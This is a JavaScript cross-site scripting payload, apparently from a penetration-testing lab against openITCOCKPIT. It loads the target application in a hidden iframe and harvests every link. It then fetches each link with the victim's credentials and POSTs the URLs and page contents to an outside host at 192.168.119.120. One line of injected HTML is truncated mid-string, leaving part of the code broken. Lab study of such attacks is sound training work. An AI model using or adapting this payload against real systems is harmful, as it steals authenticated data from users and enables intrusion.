html_element = document.getElementsByTagName("html")[0]
html_element.innerHTML = '<!DOCTYPE html><html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/> <meta name="viewport">            /6:01/

var iframe = document.createElement('iframe'); 
iframe.setAttribute("style","display:none") 
iframe.onload = actions;
iframe.width = "100%" 
iframe.height = "100%" 
iframe.src = "https://openitcockpit" 
body = document.getElementsByTagName('body')[0];
body.appendChild(iframe) 

function actions(){ 
    setTimeout(function(){getContent() }, 5000);
}

function getContent(){ 
    allA = iframe.contentDocument.getElementsByTagName("a") 
    allHrefs = [] 
    for (var i=0; i<allA.length; i++){ 
        allHrefs.push(allA[i].href)
    }
    uniqueHrefs = _.unique(allHrefs)
    validUniqueHrefs = [] 
    for(var i=0; i<uniqueHrefs.length; i++) { 
        if (validURL(uniqueHrefs[i])){ 
            validUniqueHrefs.push(uniqueHrefs[i]);
        }
    }
  
    validUniqueHrefs.forEach(href =>{ 
        fetch(href, { 
           "credentials": "include", 
           "method": "GET", 
        }) 
        .then((response) => { 
           return response.text() 
        }) 
        .then(function (text){ 
            fetch("https://192.168.119.120/content", { 
               body: "url=" + encodeURIComponent(href) + "&content=" + encodeURIComponent(text), headers: { 
               "Content-Type": "application/x-www-form-urlencoded" 
               }, 
               method: "POST" 
            }) 
        }); 
    })
}

